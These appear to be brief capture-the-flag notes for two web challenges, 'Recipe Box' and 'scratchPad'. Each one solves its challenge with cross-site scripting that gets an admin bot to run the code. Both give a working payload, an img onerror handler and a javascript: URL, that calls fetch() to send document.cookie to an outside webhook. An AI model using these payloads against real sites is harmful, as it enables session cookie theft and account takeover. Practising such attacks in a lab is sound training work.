Recipe Box: 
	If we attempt xss on the first search bar it works but cannot find any document.cookie, because we are not admin. 
	Instead, if we put the link of the page after attempting the xss in search bar in the second URL bar, the admin bot will execute it and it will work.
	We need to write in the search bar: <img src="x" onerror="fetch('https://webhook.site/fac7d8bf-3b6a-45ca-a4c6-eb4ec49a3638/?c=' + encodeURIComponent(document.cookie))">, with the webhook site so tthat we can read the fetch.


scratchPad: 
	When a browser sees a URL that starts with javascript: instead of http://, it behaves completely differently: It does not navigate to a new page. Instead, it treats the rest of the URL as a script and executes it immediately inside the current page. We can put this into the URL bar and it works: javascript:fetch('https://webhook.site/fac7d8bf-3b6a-45ca-a4c6-eb4ec49a3638/?c=' + encodeURIComponent(document.cookie));


